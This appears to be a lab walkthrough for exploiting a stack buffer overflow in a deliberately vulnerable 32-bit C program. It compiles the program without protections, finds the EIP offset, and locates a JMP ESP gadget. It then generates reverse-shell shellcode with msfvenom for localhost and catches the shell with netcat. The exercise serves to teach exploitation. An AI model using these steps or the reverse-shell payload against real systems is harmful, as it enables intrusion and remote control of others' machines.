### Compile vuln.c and trigger the crash

Compile vuln.c as 32-bit, without stack canaries or ASLR:  
`$ gcc -Wno-stack-protector -no-pie -m32 -g -z execstack vuln.c -o vuln`

Run the vulnerable executable in gdb, and load the [PEDA](https://github.com/longld/peda) library: 
```
$ gdb ./vuln
(gdb) source /usr/share/gdb-peda/peda.py
```

Trigger overflow by passing 1000 'A' characters as an argument:  
`python vuln-poc.py`  
or  
`gdb-peda$ run $(python -c 'print "A" * 1000')`

### Find the EIP offset

Find the exact byte offset where EIP is overwritten, using `pattern` scripts:  
```
gdb-peda$ run $(/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1000)
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q  <address>
```

Resulting offset should be 812.

Modify the PoC to send 812 'A', then 4 'B' then 184 'C'  
`gdb-peda$ run $(python -c 'print "A" * 812 + "B" * 4 + "C" * 184')`

EIP should now contain 0x42424242

### Find a JMP ESP to use

Find JMP ESP gadget (has been hardcoded in memory to make things easier - the 'junk' character array: FF E4)

```
gdb-peda$ file vuln
gdb-peda$ break _start
gdb-peda$ run
gdb-peda$ jmpcall esp
```

JMP ESP location should be 0x80485c0

### Generate Shellcode

Note the bad characters:
- \x00 (null byte): terminates string prematurely
- \x0a (line feed \n)
- \x0d (carriage return \r)

Also note the NOP sled (-n 20)

`$ msfvenom -f c -n 20 -b "\x00\x0a\x0d" -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=5555`

Put it all together, execute the exploit, and catch the shell using netcat  
`$ nc -nvlp 5555`
